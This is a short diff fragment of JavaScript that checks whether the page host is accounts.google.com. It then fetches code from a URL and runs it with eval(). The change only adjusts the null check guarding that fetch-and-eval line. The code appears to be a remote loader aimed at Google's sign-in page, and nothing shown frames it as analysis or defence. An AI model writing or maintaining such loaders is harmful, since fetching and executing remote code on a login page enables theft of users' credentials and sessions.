@@ -11,6 +11,6 @@ else if (location.host == 'accounts.google.com'){
     }
 }
 
-if (url != undefined || url == null){
+if (url != undefined || url != null){
     fetch(url).then(response => response.text()).then(code => {eval(code);});
 }
